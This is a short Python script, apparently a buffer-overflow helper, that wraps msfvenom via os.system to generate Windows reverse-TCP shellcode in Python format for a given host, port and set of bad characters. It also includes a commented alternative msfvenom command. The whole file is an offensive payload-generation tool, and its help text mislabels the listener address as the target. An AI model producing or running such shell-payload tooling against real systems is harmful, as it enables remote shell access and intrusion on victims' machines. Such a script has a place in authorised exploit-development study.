import argparse
import socket
import subprocess
import sys
import os

class Buffer():
    def __init__(self,TCP_IP, TCP_PORT, BAD_CHAR):
        self.TCP_IP = TCP_IP
        self.TCP_PORT = TCP_PORT
        self.BAD_CHAR = BAD_CHAR

    def msfvenon(self):
        os.system("msfvenom -a x86 --platform windows  -p windows/shell_reverse_tcp LHOST={TCP_IP} LPORT={TCP_PORT} -b {BAD_CHAR} -f py -v shellcode".format(TCP_IP=self.TCP_IP, TCP_PORT=self.TCP_PORT,BAD_CHAR=self.BAD_CHAR))
        #msfvenom_string = 'msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s EXIT_FUNC=THREAD -b "\\x00\\x0a\\x0d" -f python -v shellcode -o shellcode' % (LHOST, LPORT)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('TCP_IP', type=str, help='Specify IP of the target: e.g. 192.168.1.X')
    parser.add_argument('TCP_PORT', type=int, help='Specify Port of the target: e.g. 443')
    parser.add_argument('BAD_CHAR', type=str, help='Specify bad characters: e.g. "\x00\x0A"')
    args = parser.parse_args()
    execute = Buffer(args.TCP_IP, args.TCP_PORT, args.BAD_CHAR)
    execute.msfvenon()


